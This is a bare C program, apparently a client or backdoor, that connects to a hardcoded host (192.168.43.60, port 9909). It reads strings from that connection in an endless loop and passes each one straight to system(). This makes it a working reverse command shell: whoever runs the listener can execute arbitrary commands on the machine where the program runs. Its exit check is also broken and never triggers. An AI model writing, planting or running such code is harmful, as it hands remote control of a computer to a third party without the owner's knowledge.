#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/socket.h>
#include<errno.h>
#include<arpa/inet.h>

#define Port 9909
#define Ip "192.168.43.60"
int main()
{
	int lfd = socket(AF_INET,SOCK_STREAM,0);
	struct sockaddr_in server_addr;

	char str[BUFSIZ];
	bzero(&server_addr,sizeof(server_addr));

	inet_pton(AF_INET,Ip,&server_addr.sin_addr.s_addr);
	server_addr.sin_port = htons(Port);
	server_addr.sin_family = AF_INET;


	if(connect(lfd,(struct sockaddr *)&server_addr,sizeof(server_addr)) == -1)
	{
		perror("connect");
		exit(1);
	}
	read(lfd,str,sizeof(str));
	puts(str);

	while(1)
	{
		//memset(str,0,sizeof(str));
		bzero(str,sizeof(str));
		if(strcmp(str,"exit\n") == 0 || (read(lfd,str,sizeof(str))) == -1)
		{
			perror("read");
			exit(1);
		}
		//read(lfd,str,sizeof(str));
		puts(str);
		system(str);
	}
	close(lfd);
	return 0;
}
